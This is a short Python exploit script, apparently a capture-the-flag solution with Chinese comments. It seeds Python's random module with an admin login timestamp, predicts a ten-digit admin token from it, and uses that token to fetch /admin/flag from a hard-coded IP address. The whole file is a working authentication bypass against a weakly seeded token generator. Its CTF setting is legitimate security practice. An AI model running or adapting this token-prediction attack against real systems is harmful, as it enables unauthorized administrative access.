import requests
import random

TARGET = "http://110.42.47.58:33456"

# 从首页获取管理员登录时间戳
resp = requests.get(TARGET)
# 解析页面中的时间戳，或直接从提示获取
admin_time = 1781247600  # 替换为实际获取的时间戳

# 生成 admin token
random.seed(admin_time)
admin_token = ''.join([str(random.randint(0, 9)) for _ in range(10)])
print(f"[+] Predicted admin token: {admin_token}")

# 获取 flag
flag_resp = requests.get(f"{TARGET}/admin/flag", params={"token": admin_token})
print(flag_resp.text)